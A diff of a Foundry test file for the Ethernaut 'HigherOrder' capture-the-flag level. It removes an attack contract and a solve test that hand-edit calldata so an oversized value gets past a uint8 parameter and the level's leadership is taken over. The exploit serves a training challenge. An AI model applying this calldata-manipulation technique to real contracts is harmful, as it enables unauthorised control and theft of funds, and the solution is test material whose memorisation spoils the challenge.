@@ -13,23 +13,6 @@ interface HigherOrder {
     function registerTreasury(bytes32) external;
 }
 
-contract HigherOrderAttack {
-    function encodedData() public pure returns (bytes memory) {
-        return abi.encodeWithSignature("registerTreasury(uint8)", uint8(42));
-    }
-
-    function injectedData() public pure returns (bytes memory) {
-        bytes memory data = encodedData();
-        data[21] = hex"FF";
-        return data;
-    }
-
-    function attack(address victim) public {
-        (bool response,) = address(victim).call(injectedData());
-        if (!response) revert();
-    }
-}
-
 contract TestHigherOrder is Test, Utils {
     Ethernaut ethernaut;
     HigherOrder instance;
@@ -69,15 +52,5 @@ contract TestHigherOrder is Test, Utils {
     function testInit() public {
         vm.startPrank(player);
         assertFalse(submitLevelInstance(ethernaut, address(instance)));
-    }
-
-    /// @notice Test the solution for the level.
-    function testSolve() public {
-        vm.startPrank(player, player);
-
-        new HigherOrderAttack().attack(address(instance));
-        instance.claimLeadership();
-
-        assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
 }
